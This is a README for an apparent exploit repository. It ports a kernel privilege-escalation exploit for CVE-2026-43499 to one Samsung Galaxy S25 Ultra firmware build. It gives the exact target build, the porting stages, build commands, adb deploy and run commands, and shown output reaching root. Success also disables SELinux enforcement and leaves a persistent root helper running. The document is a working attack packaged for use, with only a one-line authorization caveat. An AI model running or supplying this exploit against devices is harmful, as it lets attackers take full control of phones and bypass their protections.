# CVE-2026-43499 — Galaxy S25 Ultra Port

This repository contains a device-specific port of the CVE-2026-43499
exploit for the Korean Samsung Galaxy S25 Ultra.

## Supported target

```text
Device: Samsung Galaxy S25 Ultra (SM-S938N)
Codename: pa3q
Android: 16 / SDK 36
Build number: S938NKSUACZF1
Build display ID: BP4A.251205.006.S938NKSUACZF1
Build fingerprint: samsung/pa3qksx/pa3q:16/BP4A.251205.006/S938NKSUACZF1_OKRACZF1:user/release-keys
Kernel: 6.6.98-android15-8-pd6ff1cd-abogkiS938NKSUACZF1-4k
Architecture: aarch64
```

The offsets and structure layouts in this repository are specific to the
firmware above. Other models and firmware builds are not supported by this
target profile.

## Reference source

This port is based on the exploit implementation published in:

- [NebuSec/CyberMeowfia — IonStack/CVE-2026-43499/exploit](https://github.com/NebuSec/CyberMeowfia/tree/b850d3bddc74c3328d5fbcc0568d21962b55d949/IonStack/CVE-2026-43499/exploit)
- Upstream revision used as the porting base: `b850d3bddc74c3328d5fbcc0568d21962b55d949`

The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).

## Main porting changes

- Added the `pa3q-S938NKSUACZF1` target offsets and kernel structure layouts.
- Added tracefs-based automatic KASLR slide recovery for the Samsung kernel.
- Ported the pselect race, fake PI waiter/task layout, CFI/FOPS stage, and
  physical read/write primitive.
- Added a KDP-safe `system_unbound_wq` user-mode-helper root path.
- Added a socket-backed root command helper at
  `/data/local/tmp/cve-2026-43499-root`.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r29 or a compatible toolchain, then run:

```sh
make -j8 PROJECT=pa3q-S938NKSUACZF1
```

Outputs:

```text
build/pa3q-S938NKSUACZF1/bin/preload.so
build/embed/su_daemon_aarch64_pie
```

## Deploy

```sh
adb push build/pa3q-S938NKSUACZF1/bin/preload.so /data/local/tmp/cve-2026-43499
adb push build/embed/su_daemon_aarch64_pie /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
```

## Run

```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

Verified result on `S938NKSUACZF1`:

```text
root umh result wake=1 complete=1 retval=0 socket=1
pipe-physrw-summary done=1 root=1
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

The initial pselect stage is race-based. A run that exits with `root=0`
before reaching the physical read/write stage can be retried. Successful
execution switches SELinux to permissive and starts the root helper until the
next reboot.

Use only on devices you own or are explicitly authorized to test.
